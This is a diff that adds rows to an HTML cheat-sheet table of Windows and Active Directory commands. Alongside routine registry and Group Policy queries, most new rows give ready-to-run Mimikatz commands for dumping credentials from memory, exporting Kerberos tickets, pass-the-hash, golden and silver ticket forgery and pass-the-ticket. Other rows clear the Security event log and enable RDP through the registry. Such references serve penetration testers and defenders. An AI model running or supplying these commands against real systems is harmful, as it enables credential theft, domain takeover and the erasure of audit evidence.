@@ -720,6 +720,133 @@
 		    <td>CMD</td>
 		    <td><a href="https://ss64.com/nt" target="_blank">Net Localgroup Command</a></td>
 		</tr>
+	        <tr>
+	            <td>Run Mimikatz as Admin</td>
+	            <td><code>mimikatz.exe</code> (run from elevated command prompt)</td>
+	            <td>Executable</td>
+	            <td><a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#summary" target="_blank">Mimikatz Cheat Sheet</a></td>
+	        </tr>
+	        <tr>
+	            <td>Dump Credentials from Memory</td>
+	            <td><code>privilege::debug</code> <br><code>sekurlsa::logonpasswords</code></td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://hadess.io/mimikatz-comprehensive-guide/" target="_blank">Comprehensive Mimikatz Guide</a></td>
+	        </tr>
+	        <tr>
+	            <td>Extract Kerberos Ticket</td>
+	            <td><code>kerberos::list /export</code></td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://adsecurity.org/?page_id=1821" target="_blank">ADSecurity - Mimikatz</a></td>
+	        </tr>
+	        <tr>
+	            <td>Pass-the-Hash Attack</td>
+	            <td><code>sekurlsa::pth /user:UserName /domain:domain.local /ntlm:hash /run:powershell.exe</code></td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://akimbocore.com/article/privilege-escalation-extracting-passwords-with-mimikatz/" target="_blank">AkimboCore - Mimikatz</a></td>
+	        </tr>
+	        <tr>
+	            <td>Enumerate All Registry Keys</td>
+	            <td><code>reg query HKLM</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://ss64.com/nt/" target="_blank">SS64 - Reg Command</a></td>
+	        </tr>
+	        <tr>
+	            <td>Check AutoStart Programs</td>
+	            <td><code>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://book.hacktricks.xyz/windows-hardening/windows-registry-persistence" target="_blank">HackTricks - Registry Persistence</a></td>
+	        </tr>
+	        <tr>
+	            <td>Modify Registry Key Permissions</td>
+	            <td><code>reg add HKLM\Software\ExampleKey /v ExampleValue /t REG_SZ /d "ExampleData" /f</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://ss64.com/nt/" target="_blank">SS64 - Reg Add Command</a></td>
+	        </tr>
+	        <tr>
+	            <td>Export Registry Hive</td>
+	            <td><code>reg export HKLM\Software\MyKey mykey.reg</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://ss64.com/nt/" target="_blank">SS64 - Reg Export Command</a></td>
+	        </tr>
+	        <tr>
+	            <td>Force Group Policy Update</td>
+	            <td><code>gpupdate /force</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://ss64.com/nt/" target="_blank">SS64 - Gpupdate Command</a></td>
+	        </tr>
+	        <tr>
+	            <td>List Applied GPOs for Computer</td>
+	            <td><code>gpresult /R /SCOPE COMPUTER</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://ss64.com/nt/" target="_blank">SS64 - Gpresult Command</a></td>
+	        </tr>
+	        <tr>
+	            <td>Enumerate All GPOs Linked to OU</td>
+	            <td><code>Get-GPLink -Domain domain.local -Target "OU=ExampleOU,DC=domain,DC=local"</code></td>
+	            <td>PowerShell</td>
+	            <td><a href="https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gplink" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
+	        <tr>
+	            <td>List All Group Policies in Domain</td>
+	            <td><code>Get-GPO -All</code></td>
+	            <td>PowerShell</td>
+	            <td><a href="https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
+	        <tr>
+	            <td>Find Local Admins on Remote Machine</td>
+	            <td><code>net localgroup Administrators /domain</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://ss64.com/nt/" target="_blank">SS64 - Net Localgroup Command</a></td>
+	        </tr>
+	        <tr>
+	            <td>View Security Event Logs</td>
+	            <td><code>Get-EventLog -LogName Security -Newest 100</code></td>
+	            <td>PowerShell</td>
+	            <td><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
+	        <tr>
+	            <td>Clear Security Event Logs</td>
+	            <td><code>Clear-EventLog -LogName Security</code></td>
+	            <td>PowerShell</td>
+	            <td><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/clear-eventlog" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
+	        <tr>
+	            <td>Enable Remote Desktop (RDP)</td>
+	            <td><code>reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://book.hacktricks.xyz/windows-hardening/enable-rdp-windows" target="_blank">HackTricks - Enable RDP</a></td>
+	        </tr>
+	        <tr>
+	            <td>Golden Ticket Attack</td>
+	            <td>
+	                <code>mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-<Domain-SID> /krbtgt:<krbtgt_hash> /id:500</code>
+	                <br>Load the ticket in session:
+	                <br><code>kerberos::ptt <ticket.kirbi></code>
+	            </td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-attacks/golden-ticket" target="_blank">HackTricks - Golden Ticket</a></td>
+	        </tr>
+	        <tr>
+	            <td>Silver Ticket Attack</td>
+	            <td>
+	                <code>mimikatz # kerberos::golden /user:UserName /domain:domain.local /sid:S-1-5-21-<Domain-SID> /target:ServerName /rc4:<service_account_hash> /service:cifs /id:500</code>
+	                <br>Load the ticket in session:
+	                <br><code>kerberos::ptt <ticket.kirbi></code>
+	            </td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://adsecurity.org/?p=2011" target="_blank">ADSecurity - Silver Ticket</a></td>
+	        </tr>
+	        <tr>
+	            <td>Pass-the-Ticket Attack</td>
+	            <td>
+	                Dump Kerberos tickets in memory:
+	                <br><code>mimikatz # sekurlsa::tickets</code>
+	                <br>Use a specific Kerberos ticket:
+	                <br><code>mimikatz # kerberos::ptt <ticket.kirbi></code>
+	            </td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#pass-the-ticket" target="_blank">Mimikatz Cheat Sheet - Pass-the-Ticket</a></td>
+	        </tr>
 		<!-- Submit your PR -->
     </tbody>
 </table>
